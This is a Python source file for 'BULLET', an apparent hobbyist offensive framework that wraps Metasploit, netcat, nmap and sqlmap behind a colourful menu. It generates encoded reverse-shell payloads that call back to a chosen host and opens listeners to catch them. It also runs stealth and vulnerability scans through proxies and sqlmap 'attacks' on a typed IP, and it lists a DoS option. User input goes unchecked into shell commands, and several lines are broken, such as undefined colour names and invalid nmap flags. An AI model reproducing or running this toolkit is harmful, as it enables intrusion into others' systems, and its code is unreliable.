#!/usr/bin/python
#
#
#                                        GNU General Public License v3.0
#                       ____________  ____    ____  ____  ____      __________ _____________
#                      /    ___    / /   /   /   / /   / /   /     /   ______//____    ____/
#                     /    /__/   / /   /   /   / /   / /   /     /   /___        /   /
#                    /    ___   <  /   /   /   / /   / /   /     /    ___/       /   /
#                   /    /__/   / /   /___/   / /   /_/   /___  /   /______     /   /
#                  /___________/ /___________/ /_____________/ /__________/    /___/
#
#                                      Code written by Wh1ppedKreem
#                            My Github profile https://github.com/Wh1ppedKreem
#
import os
import re
import base64 as b64

# The class that is responsible for adding colour to this script
class tc:  # tc in this case stands for terminal colours
    
    # No Colour
    RESET = "\u001b[0m"       # Reset

    # Normal Colours
    Black='\033[0;30m'        # Black
    Red='\033[0;31m'          # Red
    Green='\033[0;32m'        # Green
    Yellow='\033[0;33m'       # Yellow
    Blue='\033[0;34m'         # Blue
    Purple='\033[0;35m'       # Purple
    Cyan='\033[0;36m'         # Cyan
    White='\033[0;37m'        # White

    # Bold
    BBlack='\033[1;30m'       # Black
    BRed='\033[1;31m'         # Red
    BGreen='\033[1;32m'       # Green
    BYellow='\033[1;33m'      # Yellow
    BBlue='\033[1;34m'        # Blue
    BPurple='\033[1;35m'      # Purple
    BCyan='\033[1;36m'        # Cyan
    BWhite='\033[1;37m'       # White

    # Underline
    UBlack='\033[4;30m'       # Black
    URed='\033[4;31m'         # Red
    UGreen='\033[4;32m'       # Green
    UYellow='\033[4;33m'      # Yellow
    UBlue='\033[4;34m'        # Blue
    UPurple='\033[4;35m'      # Purple
    UCyan='\033[4;36m'        # Cyan
    UWhite='\033[4;37m'       # White

    # Background
    On_Black='\033[40m'       # Black
    On_Red='\033[41m'         # Red
    On_Green='\033[42m'       # Green
    On_Yellow='\033[43m'      # Yellow
    On_Blue='\033[44m'        # Blue
    On_Purple='\033[45m'      # Purple
    On_Cyan='\033[46m'        # Cyan
    On_White='\033[47m'       # White

    # High Intensity
    IBlack='\033[0;90m'       # Black
    IRed='\033[0;91m'         # Red
    IGreen='\033[0;92m'       # Green
    IYellow='\033[0;93m'      # Yellow
    IBlue='\033[0;94m'        # Blue
    IPurple='\033[0;95m'      # Purple
    ICyan='\033[0;96m'        # Cyan
    IWhite='\033[0;97m'       # White

    # Bold High Intensity
    BIBlack='\033[1;90m'      # Black
    BIRed='\033[1;91m'        # Red
    BIGreen='\033[1;92m'      # Green
    BIYellow='\033[1;93m'     # Yellow
    BIBlue='\033[1;94m'       # Blue
    BIPurple='\033[1;95m'     # Purple
    BICyan='\033[1;96m'       # Cyan
    BIWhite='\033[1;97m'      # White

    # High Intensity Backgrounds
    On_IBlack='\033[0;100m'   # Black
    On_IRed='\033[0;101m'     # Red
    On_IGreen='\033[0;102m'   # Green
    On_IYellow='\033[0;103m'  # Yellow
    On_IBlue='\033[0;104m'    # Blue
    On_IPurple='\033[0;105m'  # Purple
    On_ICyan='\033[0;106m'    # Cyan
    On_IWhite='\033[0;107m'   # White

# Regular expression for an IP address
ip_regex_pattern = (r"^(\d{1,3}\.){3}\d{1,3}$")

# This function checks to see if the input by the user matches the regular expression of an IP address
def is_ip_address(ip_address):
    return bool(re.match(ip_regex_pattern, ip_address))

# Regular expression for a port
port_regex_pattern = (r"^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$")

def clearScreen():
    os.system("clear")

# This function checks to see if the input by the user matches the regular expression of a port.
def is_valid_port(portSelection):
    return bool(re.match(port_regex_pattern, portSelection))

# This function takes the users input and displays an error message if it is not valid. CRedit for this piece of code goes to https://github.com/HBalable
def get_user_choice(is_valid_option, prompt, invalid_message=None):
    option = input(prompt).strip()
    while not is_valid_option(option):
        if invalid_message is None:
            print(f"Invalid option: {option}")
        else:
            print(invalid_message.format(option=option))
        option = input(prompt).strip()
    return option

# All banners and options start below
# Hand-made ASCII art by me ;)
BANNER = f"""\
{tc.Red}*************************************************************************************
{tc.Red}*         ____________  ____    ____  ____  ____      __________ _____________      *
{tc.Red}*        /    ___    / /   /   /   / /   / /   /     /   ______//____    ____/      *
{tc.Red}*       /    /__/   / /   /   /   / /   / /   /     /   /___        /   /           *
{tc.Red}*      /    ___   <  /   /   /   / /   / /   /     /    ___/       /   /            *
{tc.Red}*     /    /__/   / /   /___/   / /   /_/   /___  /   /______     /   /             *
{tc.Red}*    /___________/ /___________/ /_____________/ /__________/    /___/              *
{tc.Red}*                                                                                   *
{tc.Red}*                                  11111111                                         *
{tc.Red}*                                111111111111                                       *
{tc.Red}*                                111111111111                                       *
{tc.Red}*                               111  1111  111                                      *
{tc.Red}*                               111   11   111                                      *
{tc.Red}*                                11111 111111                                       *
{tc.Red}*                               111 11  11 111                                      *
{tc.Red}*                                 1 100001 1                                        *
{tc.Red}*                                 1110000111                                        *
{tc.Red}*                                   111111                                          *
{tc.Red}*                                                                                   *
{tc.Red}*                  --------- Coded By Wh1ppedKreem ---------                        *
{tc.Red}*               Follow me on Github: https://github.com/Wh1ppedKreem                *                  
{tc.Red}*                  [!] Do not use this tool for illegal purposes.                   *                
{tc.Red}*************************************************************************************{tc.RESET}
"""

QUITBANNER = f"""
{tc.Red}*************************************************************************************
{tc.Red}*         ____________  ____    ____  ____  ____      __________ _____________      *
{tc.Red}*        /    ___    / /   /   /   / /   / /   /     /   ______//____    ____/      *
{tc.Red}*       /    /__/   / /   /   /   / /   / /   /     /   /___        /   /           *
{tc.Red}*      /    ___   <  /   /   /   / /   / /   /     /    ___/       /   /            *
{tc.Red}*     /    /__/   / /   /___/   / /   /_/   /___  /   /______     /   /             *
{tc.Red}*    /___________/ /___________/ /_____________/ /__________/    /___/              *
{tc.Red}*                                                                                   *
{tc.Red}*                                  11111111                                         *
{tc.Red}*                                111111111111                                       *
{tc.Red}*                                111111111111                                       *
{tc.Red}*                               111  1111  111                                      *
{tc.Red}*                               111   11   111                                      *
{tc.Red}*                                11111 111111                                       *
{tc.Red}*                               111 11  11 111                                      *
{tc.Red}*                                 1 100001 1                                        *
{tc.Red}*                                 1110000111                                        *
{tc.Red}*                                   111111                                          *
{tc.Red}*                                                                                   *
{tc.Red}*                  --------- Coded By Wh1ppedKreem ---------                        *
{tc.Red}*       Thank you for using the BULLET framework. Hope to see you soon ;)           *                  
{tc.Red}*              Follow me on Github: https://github.com/Wh1ppedKreem                 *                
{tc.Red}*************************************************************************************{tc.RESET}
"""

OPTIONS = f"""
{tc.WHITE}
{tc.Red}[1]{tc.RESET} Generate a payload
{tc.Red}[2]{tc.RESET} Scan a network 
{tc.Red}[3]{tc.RESET} SQL Injection
{tc.Red}[4]{tc.RESET} OSINT
{tc.Red}[5]{tc.RESET} DoS attack
{tc.Red}[6]{tc.RESET} Setup a listener
{tc.Red}[7]{tc.RESET} Encode/Decode base64 string
{tc.Red}[8]{tc.RESET} Help
{tc.Red}[9]{tc.RESET} Download the requirements
{tc.Yellow}[99]{tc.RESET} Quit
{tc.RESET}
"""

NMAPBANNER = f"""
{tc.Red}
 _____  _____ ______ __   _
|_____ |      |____| | \  |
______||_____ |    | |  \_|
{tc.RESET}
"""

NMAPOPTIONS = f"""
Select Scan Intensity: 
{tc.Red}[1]{tc.RESET} Stealth Scan (may take a while)
{tc.Red}[2]{tc.RESET} Light Scan
{tc.Red}[3]{tc.RESET} Moderate Scan
{tc.Red}[4]{tc.RESET} Intense Scan
{tc.Red}[5]{tc.RESET} Super Scan
{tc.Yellow}[99]{tc.RESET} Return to main menu
{tc.RESET}
"""

SQLINJECTIONBANNER = f"""
{tc.Red}
 _____  _____  _     ___
|_____ |    \| |      |
______||_____\ |____ _|_
{tc.RESET}
"""

SQLINJECTIONOPTIONS = f"""
{tc.Red}[1]{tc.RESET} Light Scan
{tc.Red}[2]{tc.RESET} Moderate Scan
{tc.Red}[3]{tc.RESET} Intense Scan
{tc.Red}[4]{tc.RESET} Super Scan
{tc.Yellow}[99]{tc.RESET} Return to main menu
{tc.RESET}
"""

BASE64BANNER = f"""
{tc.Red}
 _____ ______ _____  _____  ______ _   _
|_____||____||_____ |_____  |_____ |___|
|_____||    | _____||_____  |_____|    |
            Decoder/Encoder
{tc.RESET}
"""

OSINTOPTIONS = "INSERT SOMETHING HERE"

# Main Function
def main():
    print(BANNER)
    while True:
        if os.geteuid() != 0:
            print(f"{tc.Yellow}[!] BULLET requires root privelages! Try running \"sudo python3 bullet.py\" to fix your issue.{tc.RESET}")
            quit()
        print(OPTIONS)
        choice = int(input("Enter an option [1-9] [99 to exit]: "))

        # Quit option
        if choice == 99:
            print(QUITBANNER)
            quit()

        # Requirements' download script starts here
        if choice == 9:
            operatingSystem = int(input("Are you on [1]linux or [2]mac? (type corresponding numbers): "))
            if operatingSystem == 1:
                importantupdatechoice = int(input("Are you using an [1]Debian-based distro or [2]Arch-based distro: "))
                if importantupdatechoice == 1:
                    os.system("chmod +x bullet.py")
                    os.system("wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run")
                    os.system("chmod +x ./metasploit-latest-linux-x64-installer.run")
                    os.system("./metasploit-latest-linux-x64-installer.run")
                    os.system("apt install nmap")
                    os.system("apt install sqlmap")
                    os.system("apt install perl")
                    os.system("apt install netcat")
                    os.system("apt install proxychains4")
                    os.system("apt install sherlock")
                    clearScreen()
                elif importantupdatechoice == 2:
                    print("I have no clue how to install metasploit on Arch-based distros.")
                    os.system("chmod +x bullet.py")
                    os.system("pacman -S nmap")
                    os.system("pacman -S sqlmap")
                    os.system("pacman -S perl")
                    os.system("pacman -S netcat")
                    os.system("pacman -S proxychains4")
                    os.system("pacman -S sherlock")
                    clearScreen()
                elif (operatingSystem > 3) or (operatingSystem == ""):
                    print(f"{tc.Red}[!] Unsupported/Invalid option.{tc.RESET}")
                else:
                    break
            elif operatingSystem == 2:
                os.system("ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"")
                os.system("brew install nmap")
                os.system("brew install sqlmap")
                os.system("brew install perl")
                os.system("brew install netcat")
                os.system("brew install proxychains-ng")
                os.system("brew install --cask metasploit")
        
        # Listener option
        if choice == 6:
            mainListenerChoice = input("Enter port for listener >>> ")
            os.system(f"nc -nvlp {mainListenerChoice}")
        
        # msfvenom payload + netcat listener scripts start here 
        if choice == 1:
            clearScreen()
            print(f"{tc.GREEN}Your payload will automatically be encoded with shikata_ga_nai{tc.RESET}")
            msfvPlatform = input("Type a valid operating system for the payload[windows/mac/linux/android]: ")
            reverseConnection = input("Pick between [reverse_tcp], [bind_tcp], [reverse_http], [reverse_https] (type EXACTLY as shown or the command will fail): ")
            lhost = get_user_choice(
                is_ip_address, 
                "Enter LHOST: ",
                f"{tc.Yellow}Invalid IP address, try again.{tc.RESET}"
            )
            lport = get_user_choice(
                is_valid_port,
                "Enter LPORT: ",
                f"{tc.Yellow}Invalid port, try again.{tc.RESET}"
            )
            payloadExtension = input("Enter a file extension for the payload [py/exe/sh/or any other compatible] (type EXACTLY as shown): ")
            payloadName = input("Enter a name for the payload: ")
            os.system(f"msfvenom --platform {msfvPlatform} -p {msfvPlatform}/shell/{reverseConnection} lhost={lhost} lport={lport} -e x86/shikata_ga_nai -b \"badchars\" -f {payloadExtension} > {payloadName}.{payloadExtension}")
            listenerChoice = str(input("Would you like to setup a listener? [y/n]: "))
            if (listenerChoice == "y") or (listenerChoice == "Y"):
                listenerPort = get_user_choice(
                is_valid_port, 
                "Enter the port for the listener >>> ", 
                f"{tc.Yellow}Invalid port, try again.{tc.RESET}"
                )
                os.system(f"nc -nvlp {listenerPort}")
            elif (listenerChoice == "n") or (listenerChoice == "N"):
                print("No listener has been set.")
                return main()
            elif listenerChoice != ("y", "Y", "n", "N"):
                print("Invalid Option - returning to main menu.")
                return main()
        # Nmap script starts here
        elif choice == 2:
            print(NMAPBANNER, NMAPOPTIONS)
            nmapChoice = int(input("Enter a choice [1-5] [99 to return to main menu]: "))
            # Returns to main menu
            if nmapChoice == 99:
                return main()
            # Prompts user to input desiRed IP address
            ip_address = get_user_choice(
                is_ip_address, 
                "Enter the IP address you would like to scan >>> ", 
                f"{tc.Yellow}Invalid IP address, try again.{tc.RESET}"
            )
            # Prompts user to input desiRed port
            nmapPortSelection = get_user_choice(
                is_valid_port, 
                "Enter the port you would like to scan >>> ", 
                "Invalid port, try again."
            )
            if nmapChoice == 1:
                # Stealth Scan
                proxyChoice = str(input("Would you like to use a proxy? (y/n) >>> "))
                if (proxyChoice == "y") or (proxyChoice == "Y") or (proxyChoice == "yes") or (proxyChoice == "Yes") or (proxyChoice == "YES"):
                    portQuery = input("Would you like to [1] scan a specific port or [2] all ports? >>> ")
                    if portQuery == 1:
                        os.system(f"proxychains nmap -T1 {ip_address} -p {nmapPortSelection}")
                    elif portQuery == 2:
                        os.system(f"proxychains nmap -T1 {ip_address}")
                elif (proxyChoice == "n") or (proxyChoice == "N") or (proxyChoice == "no") or (proxyChoice == "No") or (proxyChoice == "NO"):
                    portQuery = input("Would you like to [1] scan a specific port or [2] all ports? >>> ")
                    if portQuery == 1:
                        os.system(f"nmap -T1 {ip_address} -p {nmapPortSelection}")
                    elif portQuery == 2:
                        os.system(f"nmap -T1 {ip_address}")
            elif nmapChoice == 2:
                # Light Scan
                proxyChoice = str(input("Would you like to use a proxy? (y/n) >>> "))
                if (proxyChoice == "y") or (proxyChoice == "Y") or (proxyChoice == "yes") or (proxyChoice == "Yes") or (proxyChoice == "YES"):
                    portQuery = input("Would you like to [1] scan a specific port or [2] all ports? >>> ")
                    if portQuery == 1:
                        os.system(f"proxychains nmap -T3 {ip_address} -p {nmapPortSelection}")
                    elif portQuery == 2:
                        os.system(f"proxychains nmap -T3 {ip_address}")
                elif (proxyChoice == "n") or (proxyChoice == "N") or (proxyChoice == "no") or (proxyChoice == "No") or (proxyChoice == "NO"):
                    portQuery = input("Would you like to [1] scan a specific port or [2] all ports? >>> ")
                    if portQuery == 1:
                        os.system(f"nmap -T3 {ip_address} -p {nmapPortSelection}")
                    elif portQuery == 2:
                        os.system(f"nmap -T3 {ip_address}")
            elif nmapChoice == 3:
                # Moderate Scan
                portQuery = input("Would you like to [1] scan a specific port or [2] all ports? >>> ")
                if portQuery == 1:
                    os.system(f"nmap -sC -sV -O {ip_address} -p {nmapPortSelection}")
                elif portQuery == 2:
                    os.system(f"nmap -sC -sV -O {ip_address}")
            elif nmapChoice == 4:
                # Intense Scan
                portQuery = input("Would you like to [1] scan a specific port or [2] all ports? >>> ")
                if portQuery == 1:
                    os.system(f"nmap -sC -sV -O --script vuln -T6 {ip_address} -p {nmapPortSelection}")
                elif portQuery == 2:
                    os.system(f"nmap -sC -sV -O --script vuln -T6 {ip_address}")
            elif choice == 5:
                # Super Scan
                verbosity_level = input("Select the level of verbosity (the mount of info shown) (1/2/3) >>> ")
                verbosity_args = f"-{'v'*{verbosity_level}}"
                portQuery = input("Would you like to [1] scan a specific port or [2] all ports? >>> ")
                if portQuery == 1:
                    os.system(f"nmap -sC -sV -O --script vuln -T6 {verbosity_args} {ip_address} -p {nmapPortSelection}")
                elif portQuery == 2:
                    os.system(f"nmap -sC -sV -O --script vuln -T6 {verbosity_args} {ip_address}")
            else:
                # Returns to the beginning of the function once complete
                return main()
        elif choice == 3:
            print(SQLINJECTIONBANNER, SQLINJECTIONOPTIONS)
            sqlChoice = int(input("Enter a choice [1-4] [99 to return to main menu]"))
            # Returns to main menu
            if sqlChoice == 99:
                return main()
            # Prompts user to input desiRed IP address
            ip_address = get_user_choice(
                is_ip_address,
                "Enter the IP address you would like to attack >>> ",
                "Invalid IP address, try again."
            )
            if sqlChoice == 1:
                # Light Scan
                os.system(f"sqlmap {ip_address} --abs")

        elif choice == 7:
            print(BASE64BANNER)
            base64choice = int(input("Would you like to [1]encode or [2]decode a string? >>> "))
            if base64choice == 1:
                base64DecodedString = str(input("Enter the string you would like to encode in base64: "))
                base64DecodedString_bytes = base64DecodedString.encode("ascii")
                base64EncodedString = b64.b64encode(base64DecodedString_bytes)
                base64EncodedString_bytes = base64EncodedString.decode("ascii")
                print("Your encoded string is: ")
                print(f"{tc.GREEN}{base64EncodedString_bytes}{tc.RESET}")
            elif base64choice == 2:
                base64encodedstring = str(input("Enter the string you would like to decode from base64: "))
                base64encodedstring_bytes = base64encodedstring.encode("ascii")
                base64decodedstring = b64.b64decode(base64encodedstring_bytes)
                base64decodedstring_bytes = base64decodedstring.decode("ascii")
                print("Your decoded string is: ")
                print(f"{tc.GREEN}{base64decodedstring_bytes}{tc.RESET}")

        elif choice == 8:
            print(f"""
            Frequent {tc.Red}errors{tc.RESET} and {tc.GREEN}solutions{tc.RESET}:
            1. Some choices not working or giving error messages: You may not have downloaded the requirements for the framework.
            Select choice 9 and enter your corresponding operating system, then your requirements should automatically start
            downloading. If not, check if you are connected to the internet or if your firewall is blocking any downloads or
            connections.
            
            2. Some options are not working although I have downloaded the requirements: If the error is from the third party tools
            that this framework uses, try updating them separately or deleting them completely from the system and Redownloading them 
            either using the download option on the framework or manually. If the error persists, then I'm afraid the only option is to 
            wait for a patch from the developers of those tools.

            3. The proxy option does not work: The proxy this framework utilises all throughout is proxychains to navigate to the file 
            \"/etc/proxychains.conf\" and comment out the \"strict chain\" option and uncomment the \"dynamic chain\" option. Then,  directly 
            below the part of the file that says \"socks4  127.0.0.1  9050\", type \"socks5  127.0.0.1  9050\" with each word below the one 
            similar to it e.g. \"socks5\" goes directly below \"socks4\", \"127.0.0.1z" goes directly below \"127.0.0.1\" and \"9050\" goes directly below \"9050\".
            """)



if __name__ == "__main__":
    main()
